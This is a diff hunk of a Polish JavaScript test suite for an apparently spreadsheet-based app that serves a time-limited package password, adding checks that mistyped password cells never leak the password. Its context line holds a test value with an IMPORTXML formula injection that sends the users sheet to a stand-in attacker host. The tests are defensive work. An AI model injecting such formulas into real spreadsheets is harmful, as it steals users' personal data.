@@ -212,6 +212,12 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
   ok('administrator wpisuje nowe hasło i nowy termin → od razu obowiązuje (bez zmian w aplikacji)', (() => { const r = B.post({ akcja: 'haslo_paczki', kod: '12345' }, H); return r.status === 'ok' && r.haslo === 'Nowe-Haslo-na-grudzien' && r.wazne_do === '2099-01-31'; })());
   wpisz('haslo_paczki_wazne_do', new Date('2099-03-05T00:00:00')); wpisz('haslo_paczki', 123456789);
   ok('arkusz zamienia wpisaną datę na datę, a numeryczne hasło na liczbę — obie postacie działają (data → RRRR-MM-DD, liczba → tekst)', (() => { const r = B.post({ akcja: 'haslo_paczki', kod: '12345' }, H); return r.status === 'ok' && r.haslo === '123456789' && r.wazne_do === '2099-03-05'; })());
+  ok('nowa zakładka Ustawienia ma komórkę hasła w formacie tekstowym (zera wiodące i daty zostają tym, co wpisano)', ust().formaty['2,2'] === '@' && ust().formaty['3,2'] === undefined, JSON.stringify(ust().formaty));
+  for (const [opis, v] of [['data', new B.ctx.Date('2027-01-15T00:00:00')], ['wartość logiczna', true], ['ułamek („1234,5678” w polskim arkuszu)', 1234.5678], ['liczba bez pełnej precyzji', 12345678901234567890]]) {
+    wpisz('haslo_paczki', v); const r = B.post({ akcja: 'haslo_paczki', kod: '12345' }, H);
+    ok(`komórka hasła z wartością innego typu (${opis}) → „brak”, hasło nie wychodzi`, r.status === 'brak' && !('haslo' in r), JSON.stringify(r));
+  }
+  ok('…a Log mówi administratorowi, co poprawić', B.get('Log').w.some(r => r[2] === 'haslo_paczki_blad' && /Zwykly tekst/.test(r[3])));
   wpisz('haslo_paczki', '   ');
   ok('samo odstępy w polu hasła = wysyłka wyłączona („brak”)', B.post({ akcja: 'haslo_paczki', kod: '12345' }, H).status === 'brak');
   ok('zakładka Ustawienia nie jest nadpisywana przez zapytania klienta (żadna akcja nie zapisuje tam danych od klienta)', ust().w.length === 4);
